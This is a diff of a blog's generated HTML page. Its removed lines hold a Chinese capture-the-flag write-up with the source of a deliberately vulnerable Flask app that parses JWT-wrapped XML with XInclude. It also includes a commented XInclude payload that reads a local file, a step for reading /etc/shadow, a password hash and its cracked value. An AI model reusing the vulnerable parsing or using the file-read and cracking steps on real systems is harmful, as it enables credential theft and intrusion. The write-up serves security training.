-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, url_for</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;wcft&#123;fake-flag&#125;&#x27;</span></span><br><span class="line">FLAGUSER_PASSWORD = os.environ.get(<span class="string">&#x27;FLAGUSER_PASSWORD&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;fake-password&#x27;</span></span><br><span class="line"></span><br><span class="line">JWT_SECRET = os.environ.get(<span class="string">&#x27;JWT_SECRET&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;secret&#x27;</span></span><br><span class="line"></span><br><span class="line">JWT_ALG = <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">JWT_COOKIE = <span class="string">&#x27;appdata&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">root</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret-welcome-935734&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret_welcome</span>():</span><br><span class="line">    <span class="comment"># There is a linux user named &#x27;flaguser&#x27;</span></span><br><span class="line">    <span class="comment"># Login here with that username and their linux password.</span></span><br><span class="line">    auth = request.authorization</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> auth <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> auth.username != <span class="string">&#x27;flaguser&#x27;</span> <span class="keyword">or</span> auth.password != FLAGUSER_PASSWORD:</span><br><span class="line">        resp = flask.Response(<span class="string">&#x27;Please provide the right credentials to get the flag&#x27;</span>)</span><br><span class="line">        resp.headers[<span class="string">&#x27;WWW-Authenticate&#x27;</span>] = <span class="string">&#x27;Basic&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp, <span class="number">401</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;Congrats, here is your flag: <span class="subst">&#123;FLAG&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/welcome&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():</span><br><span class="line">    cookie = request.cookies.get(JWT_COOKIE)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Error: missing <span class="subst">&#123;JWT_COOKIE&#125;</span> cookie value&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        jwtData = jwt.decode(cookie, JWT_SECRET, algorithms=[JWT_ALG])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: unable to decode JWT cookie&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    data = jwtData[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: missing data field from decoded JWT&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    xmlText = <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&amp;&#x27;</span> <span class="keyword">in</span> xmlText:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: No entity references please&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;%&#x27;</span> <span class="keyword">in</span> xmlText:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: No parameter file entities please&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    tmp = tempfile.NamedTemporaryFile()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Open the file for writing.</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(tmp.name, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(xmlText)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        parser = etree.XMLParser(resolve_entities=<span class="literal">False</span>)</span><br><span class="line">        xmlDoc = etree.parse(tmp.name, parser=parser)</span><br><span class="line">        xmlDoc.xinclude()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;XML Error:&#x27;</span>, e)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: Error parsing XML&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    usernameElement = xmlDoc.find(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> usernameElement <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: Missing username element in XML&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    username = usernameElement.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;welcome.html&quot;</span>, username=username)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: username is required&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    username = <span class="built_in">str</span>(username)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">&#x27;^[a-z] $&#x27;</span>, username):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: username must be only lowercase letters&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: username must be at least 3 letters&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &gt; <span class="number">20</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Error: username must be no longer than 20 letters&#x27;</span>, <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Useful for chal development</span></span><br><span class="line">    <span class="comment"># username = &#x27;&lt;xi:include xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot; href=&quot;/app/app.py&quot; parse=&quot;text&quot;/&gt;&#x27;</span></span><br><span class="line">    xml = <span class="string">f&#x27;&lt;data&gt;&lt;username&gt;<span class="subst">&#123;username&#125;</span>&lt;/username&gt;&lt;/data&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">    jwtData = &#123;<span class="string">&quot;data&quot;</span>: xml&#125;</span><br><span class="line"></span><br><span class="line">    cookie = jwt.encode(jwtData, JWT_SECRET, algorithm=JWT_ALG)</span><br><span class="line"></span><br><span class="line">    response = flask.make_response(<span class="string">f&#x27;hello <span class="subst">&#123;username&#125;</span>&#x27;</span>)</span><br><span class="line">    response.set_cookie(JWT_COOKIE, cookie)</span><br><span class="line"></span><br><span class="line">    response.headers[<span class="string">&#x27;location&#x27;</span>] = url_for(<span class="string">&#x27;welcome&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response, <span class="number">302</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-
-<p>在这个文件里可以得知，有一个新的路由<code>/secret-welcome-935734</code>在这里登陆成功后得到flag，用户名为<code>flaguser</code>，密码我们可以用xxe读取<code>/etc/passwd或者/etc/shadow</code>在shadow中我们得知密码为<code>$1$hack$BzqsFHqkPjQ2Sn9amFsgN0</code>这个可以利用<code>hashcat</code>爆破</p>
-<p>关于hashcat的用法<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9909ce4c9e7c"></a></p>
-<p>爆破出来密码是<code>qqz3</code>登录得到flag</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1383,7 +1391,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-count">44</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1432,12 +1440,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">150k</span>
+    <span title="站点总字数">155k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:16</span>
+    <span title="站点阅读时长">2:21</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
